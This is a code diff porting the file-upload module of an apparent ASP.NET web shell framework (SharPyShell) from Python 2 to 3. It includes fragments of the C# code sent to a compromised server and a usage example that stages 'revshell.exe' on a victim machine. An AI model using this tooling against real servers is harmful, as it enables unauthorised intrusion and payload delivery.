@@ -35,7 +35,7 @@ class Upload(Module):
                 #upload /tmp/revshell.exe C:\Users\Public\revshell.exe 1024
     """
 
-    _runtime_code = ur"""
+    _runtime_code = r"""
             using System;using System.IO;using System.Diagnostics;using System.Text;
             public class SharPyShell{                    
                 byte[] Upload(string path, byte[] file_bytes){
@@ -56,7 +56,7 @@ class Upload(Module):
             }
     """
 
-    __runtime_code_split_file = ur"""
+    __runtime_code_split_file = r"""
             using System;using System.IO;using System.Diagnostics;using System.Text;
             public class SharPyShell{                    
                 byte[] Upload(string path, byte[] file_bytes){
@@ -80,7 +80,7 @@ class Upload(Module):
             }
     """
 
-    __runtime_code_init_file = ur"""
+    __runtime_code_init_file = r"""
                 using System;using System.IO;using System.Diagnostics;using System.Text;
                 public class SharPyShell{                    
                     string InitFile(string path){
@@ -164,8 +164,8 @@ class Upload(Module):
                 decrypted_response = self._decrypt_response(encrypted_response)
                 parsed_response = self._parse_response(decrypted_response)
                 if len(requests) > 1:
-                    print 'Chunk ' + str(i + 1) + ' --> ' + str(chunk_size*i) + ' - ' + str(chunk_size*i+chunk_size) +\
-                          ' bytes written correctly to ' + upload_output_path
+                    print ('Chunk ' + str(i + 1) + ' --> ' + str(chunk_size*i) + ' - ' + str(chunk_size*i+chunk_size) +\
+                          ' bytes written correctly to ' + upload_output_path)
         except ModuleException as module_exc:
             parsed_response = str(module_exc)
         except Exception:
